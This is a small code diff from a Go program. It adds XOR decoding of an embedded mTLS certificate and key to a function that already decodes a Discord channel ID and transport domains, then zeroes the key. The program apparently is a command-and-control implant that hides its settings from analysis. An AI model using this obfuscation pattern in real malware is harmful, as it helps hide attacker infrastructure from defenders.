@@ -59,6 +59,8 @@ func deobfuscateConfig() {
 	discordChannelID = xorDecodeString(discordChannelID, keyBytes)
 	httpxConfig = xorDecodeString(httpxConfig, keyBytes)
 	httpxDomains = xorDecodeString(httpxDomains, keyBytes)
+	mtlsCertPEM = xorDecodeString(mtlsCertPEM, keyBytes)
+	mtlsKeyPEM = xorDecodeString(mtlsKeyPEM, keyBytes)
 	// Zero the XOR key — no longer needed after deobfuscation
 	zeroBytes(keyBytes)
 }
